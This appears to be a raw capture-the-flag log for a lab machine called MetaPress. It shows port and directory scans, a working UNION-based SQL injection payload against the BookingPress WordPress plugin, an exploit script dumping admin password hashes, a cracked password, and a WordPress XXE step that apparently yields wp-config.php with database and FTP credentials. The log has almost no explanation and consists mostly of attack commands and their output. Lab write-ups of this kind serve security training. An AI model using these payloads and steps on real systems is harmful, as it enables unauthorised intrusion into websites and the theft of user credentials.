└─$ nmap -A -p- -Pn 10.10.11.186 
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-10 11:42 CST
Nmap scan report for metapress.htb (10.10.11.186)
Host is up (0.068s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c4b44617d2102d8fec1dc927fecd79ee (RSA)
|   256 2aea2fcb23e8c529409cab866dcd4411 (ECDSA)
|_  256 fd78c0b0e22016fa050debd83f12a4ab (ED25519)
80/tcp open  http    nginx 1.18.0
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-generator: WordPress 5.6.2
|_http-title: MetaPress &#8211; Official company site
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: nginx/1.18.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.93%I=7%D=11/10%Time=636D3AB3%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,8F,"220\x20ProFTPD\x20Server\x20\(Debian\)\x20\[::ffff:10\.10
SF:\.11\.186\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20cr
SF:eative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creativ
SF:e\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 753.04 seconds

└─$ feroxbuster -u http://metapress.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,html,txt,git,pdf -q -fs 200,301
200      GET      155l      552w        0c http://metapress.htb/
301      GET        0l        0w        0c http://metapress.htb/about/ => http://metapress.htb/about-us/
301      GET        0l        0w        0c http://metapress.htb/rss/ => http://metapress.htb/feed/
301      GET        0l        0w        0c http://metapress.htb/index.php => http://metapress.htb/
200      GET     1033l     3343w        0c http://metapress.htb/events/
301      GET        0l        0w        0c http://metapress.htb/events/2006/ => http://metapress.htb/events/
301      GET        0l        0w        0c http://metapress.htb/events/1/ => http://metapress.htb/events/
301      GET        0l        0w        0c http://metapress.htb/events/08/ => http://metapress.htb/events/
301      GET        0l        0w        0c http://metapress.htb/events/rss/ => http://metapress.htb/events/feed/
301      GET        0l        0w        0c http://metapress.htb/events/03/ => http://metapress.htb/events/
301      GET        0l        0w        0c http://metapress.htb/events/2005/ => http://metapress.htb/events/
301      GET        0l        0w        0c http://metapress.htb/events/11/ => http://metapress.htb/events/
301      GET        0l        0w        0c http://metapress.htb/events/12/ => http://metapress.htb/events/
301      GET        0l        0w        0c http://metapress.htb/events/10/ => http://metapress.htb/events/
301      GET        0l        0w        0c http://metapress.htb/events/about/ => http://metapress.htb/about-us/
301      GET        0l        0w        0c http://metapress.htb/events/events/ => http://metapress.htb/events/
301      GET        0l        0w        0c http://metapress.htb/events/2/ => http://metapress.htb/events/
301      GET        0l        0w        0c http://metapress.htb/events/01/ => http://metapress.htb/events/
301      GET        0l        0w        0c http://metapress.htb/events/05/ => http://metapress.htb/events/
301      GET        0l        0w        0c http://metapress.htb/events/04/ => http://metapress.htb/events/
301      GET        0l        0w        0c http://metapress.htb/events/07/ => http://metapress.htb/events/
301      GET        0l        0w        0c http://metapress.htb/events/09/ => http://metapress.htb/events/
301      GET        0l        0w        0c http://metapress.htb/events/02/ => http://metapress.htb/events/
301      GET        0l        0w        0c http://metapress.htb/events/3/ => http://metapress.htb/events/
301      GET        0l        0w        0c http://metapress.htb/events/13/ => http://metapress.htb/events/
301      GET        0l        0w        0c http://metapress.htb/events/4/ => http://metapress.htb/events/
301      GET        0l        0w        0c http://metapress.htb/events/14/ => http://metapress.htb/events/
301      GET        0l        0w        0c http://metapress.htb/events/15/ => http://metapress.htb/events/
301      GET        0l        0w        0c http://metapress.htb/events/16/ => http://metapress.htb/events/
301      GET        0l        0w        0c http://metapress.htb/events/2004/ => http://metapress.htb/events/
301      GET        0l        0w        0c http://metapress.htb/events/18/ => http://metapress.htb/events/
301      GET        0l        0w        0c http://metapress.htb/events/20/ => http://metapress.htb/events/
301      GET        0l        0w        0c http://metapress.htb/events/22/ => http://metapress.htb/events/
301      GET        0l        0w        0c http://metapress.htb/events/21/ => http://metapress.htb/events/
301      GET        0l        0w        0c http://metapress.htb/events/6/ => http://metapress.htb/events/
301      GET        0l        0w        0c http://metapress.htb/events/5/ => http://metapress.htb/events/
301      GET        0l        0w        0c http://metapress.htb/events/19/ => http://metapress.htb/events/
301      GET        0l        0w        0c http://metapress.htb/events/24/ => http://metapress.htb/events/
301      GET        0l        0w        0c http://metapress.htb/events/2007/ => http://metapress.htb/events/
301      GET        0l        0w        0c http://metapress.htb/events/23/ => http://metapress.htb/events/
301      GET        0l        0w        0c http://metapress.htb/events/17/ => http://metapress.htb/events/
301      GET        0l        0w        0c http://metapress.htb/events/27/ => http://metapress.htb/events/
301      GET        0l        0w        0c http://metapress.htb/events/26/ => http://metapress.htb/events/
301      GET        0l        0w        0c http://metapress.htb/events/9/ => http://metapress.htb/events/
200      GET      155l      552w        0c http://metapress.htb/0/
200      GET       50l      114w        0c http://metapress.htb/feed/
301      GET        0l        0w        0c http://metapress.htb/0/events/ => http://metapress.htb/events/
301      GET        0l        0w        0c http://metapress.htb/0/rss/ => http://metapress.htb/0/feed/
301      GET        0l        0w        0c http://metapress.htb/0/about/ => http://metapress.htb/about-us/
200      GET      384l     3177w    19915c http://metapress.htb/license.txt
200      GET       97l      823w     7278c http://metapress.htb/readme.html


https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357

└─$ curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=61a943f4b5&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Thu, 10 Nov 2022 18:42:12 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/8.0.24
X-Robots-Tag: noindex
X-Content-Type-Options: nosniff
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
X-Frame-Options: SAMEORIGIN
Referrer-Policy: strict-origin-when-cross-origin

[{"bookingpress_service_id":"10.5.15-MariaDB-0+deb11u1","bookingpress_category_id":"Debian 11","bookingpress_service_name":"debian-linux-gnu","bookingpress_service_price":"$1.00","bookingpress_service_duration_val":"2","bookingpress_service_duration_unit":"3","bookingpress_service_description":"4","bookingpress_service_position":"5","bookingpress_servicedate_created":"6","service_price_without_currency":1,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]                                                                                                       

└─$ python3 booking-press-expl.py -u http://metapress.htb -n 61a943f4b5&
[1] 46154
-- BookingPress PoC
-- Got db fingerprint:  10.5.15-MariaDB-0+deb11u1
-- Count of users:  2
|admin|admin@metapress.htb|$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.|
|manager|manager@metapress.htb|$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70|


└─$ hashcat --show hash                                      
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

400 | phpass | Generic KDF

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70:partylikearockstar



manager
partylikearockstar

https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/



```php
server {

	listen 80;
	listen [::]:80;

	root /var/www/metapress.htb/blog;

	index index.php index.html;

        if ($http_host != "metapress.htb") {
                rewrite ^ http://metapress.htb/;
        }

	location / {
		try_files $uri $uri/ /index.php?$args;
	}
    
	location ~ \.php$ {
		include snippets/fastcgi-php.conf;
		fastcgi_pass unix:/var/run/php/php8.0-fpm.sock;
	}

	location ~* \.(js|css|png|jpg|jpeg|gif|ico|svg)$ {
		expires max;
		log_not_found off;
	}

}
```


```php
<?php
/** The name of the database for WordPress */
define( 'DB_NAME', 'blog' );

/** MySQL database username */
define( 'DB_USER', 'blog' );

/** MySQL database password */
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );

/**#@+
 * Authentication Unique Keys and Salts.
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n>+3m?.B/:' );
define( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' );
define( 'LOGGED_IN_KEY',    'J+mxCaP4z<g.6P^t`ziv>dd}EEi%48%JnRq^2MjFiitn#&n+HXv]||E+F~C{qKXy' );
define( 'NONCE_KEY',        'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' );
define( 'AUTH_SALT',        '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*<~:0]s}d<&M;.,x0z~R>3!D' );
define( 'SECURE_AUTH_SALT', '>`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&~omiH^jVC?2-I?I.' );
define( 'LOGGED_IN_SALT',   '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&^JsI`M)FJTJEVI) N#NOidIf=' );
define( 'NONCE_SALT',       '.sU&CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' );

/**
 * WordPress Database Table prefix.
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```
